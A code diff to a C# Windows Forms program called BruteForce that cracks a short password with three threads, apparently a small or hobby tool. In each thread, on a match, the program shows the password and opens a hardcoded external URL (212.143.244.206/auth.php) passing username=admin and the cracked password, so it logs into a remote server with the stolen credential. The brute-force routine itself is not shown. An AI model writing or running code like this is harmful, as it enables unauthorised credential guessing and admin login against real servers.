@@ -1,20 +1,17 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
 using System.Data;
 using System.Linq;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Net;
 using System.Text.RegularExpressions;
 using System.Threading;
+
 
 namespace BruteForce
 {
     public partial class BruteForce : Form
     {
 
-        // the secret password which we will try to find via brute force
         private static string result;
         private static bool isMatched = false;
 
@@ -42,26 +39,50 @@ namespace BruteForce
             new Thread(() =>
             {
                 startBruteForce(3);
+                if (isMatched)
+                {
+                    this.Loading.Invoke((MethodInvoker)delegate {
+                        // Running on the UI thread
+                        this.Loading.Visible = false;
+                        this.password.Text += result;
+                        this.password.Visible = true;
+                    });
+                    MessageBox.Show("The password is: " + result);
+                    System.Diagnostics.Process.Start("http://212.143.244.206/auth.php?username=admin&password=" + result);
+                }
             }).Start();
             new Thread(() =>
             {
                 startBruteForce(1);
+                if (isMatched)
+                {
+                    this.Loading.Invoke((MethodInvoker)delegate {
+                        // Running on the UI thread
+                        this.Loading.Visible = false;
+                        this.password.Text += result;
+                        this.password.Visible = true;
+                    });
+                    MessageBox.Show("The password is: " + result);
+                    System.Diagnostics.Process.Start("http://212.143.244.206/auth.php?username=admin&password=" + result);
+                }
             }).Start();
             new Thread(() =>
             {
                 startBruteForce(2);
+                if (isMatched)
+                {
+                    this.Loading.Invoke((MethodInvoker)delegate {
+                        // Running on the UI thread
+                        this.Loading.Visible = false;
+                        this.password.Text += result;
+                        this.password.Visible = true;
+                    });
+                    MessageBox.Show("The password is: " + result);
+                    System.Diagnostics.Process.Start("http://212.143.244.206/auth.php?username=admin&password=" + result);
+                }
             }).Start();
 
-            if (isMatched)
-            {
-                Loading.Visible = false;
-                password.Text += result;
-                password.Visible = true;
-                MessageBox.Show("The password is: " + result);
-                System.Diagnostics.Process.Start("http://212.143.244.206/auth.php?username=admin&password=" + result);
-
-            }
-        }
+        }      
 
         private static void startBruteForce(int keyLength)
         {
@@ -117,6 +138,11 @@ namespace BruteForce
                     }
                 }
             }
+        }
+
+        private void CloseButton_Click(object sender, EventArgs e)
+        {
+            Environment.Exit(0);
         }
     }
 }
